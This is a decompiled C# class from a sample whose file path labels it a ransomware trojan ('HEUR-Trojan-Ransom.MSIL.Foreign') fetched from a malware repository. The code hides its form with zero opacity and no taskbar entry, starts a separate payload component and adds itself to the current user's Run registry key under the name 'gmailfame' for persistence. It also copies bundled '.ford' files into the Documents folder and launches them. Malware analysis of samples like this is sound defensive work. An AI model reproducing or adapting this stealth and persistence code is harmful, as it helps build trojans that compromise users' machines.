// Decompiled with JetBrains decompiler
// Type: thandhwiar.Form1
// Assembly: thandhwiar, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 89805F93-CF8A-4ECE-A0DD-C3C2D313114A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-a0f6963845d7aeae328048da66059059fdbcb6cc30712fd10a34018caf0bd28a.exe

using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace thandhwiar
{
  public class Form1 : Form
  {
    private MSAMCDM mainvp = new MSAMCDM();
    private OCATHRE thiqavsnaisStateObj = new OCATHRE();
    private IContainer components;

    public Form1() => this.InitializeComponent();

    private void Form1_Load(object sender, EventArgs e)
    {
      try
      {
        this.FormBorderStyle = FormBorderStyle.SizableToolWindow;
        Thread.Sleep(2106);
        this.mainvp.do_start();
        this.thiqavsnaisDoCons();
      }
      catch
      {
      }
    }

    private void thiqavsnaiscallCon()
    {
      try
      {
        this.thiqavsnaisStateObj.timer = new System.Threading.Timer(new TimerCallback(this.thiqavsnaissetupCons), (object) this.thiqavsnaisStateObj, 35110, 42110);
      }
      catch
      {
      }
    }

    private void thiqavsnaissetupCons(object dource)
    {
      try
      {
        this.thiqavsnaisDoCons();
        this.thiqavsnaisStateObj.timer.Dispose();
      }
      catch
      {
      }
    }

    private void thiqavsnaisDoCons()
    {
      try
      {
        string str = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run|";
        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(str.Split('|')[0], true);
        if (registryKey.GetValue("gmailfame") == null)
          registryKey.SetValue("gmailfame", (object) Application.ExecutablePath);
        this.thiqavsnaisStateObj.timer.Dispose();
      }
      catch
      {
      }
    }

    private void open_files()
    {
      try
      {
        foreach (FileInfo file in new DirectoryInfo(Path.GetDirectoryName(Application.ExecutablePath)).GetFiles("*.ford"))
        {
          string str = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\" + file.Name.Replace(".ford", "").Replace("$", ".");
          File.WriteAllBytes(str, File.ReadAllBytes(file.FullName));
          Process.Start(str);
        }
      }
      catch (Exception ex)
      {
      }
    }

    private void Form1_FormClosing(object sender, FormClosingEventArgs e)
    {
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(0, 0);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Name = nameof (Form1);
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.Text = nameof (Form1);
      this.FormClosing += new FormClosingEventHandler(this.Form1_FormClosing);
      this.Load += new EventHandler(this.Form1_Load);
      this.ResumeLayout(false);
    }
  }
}
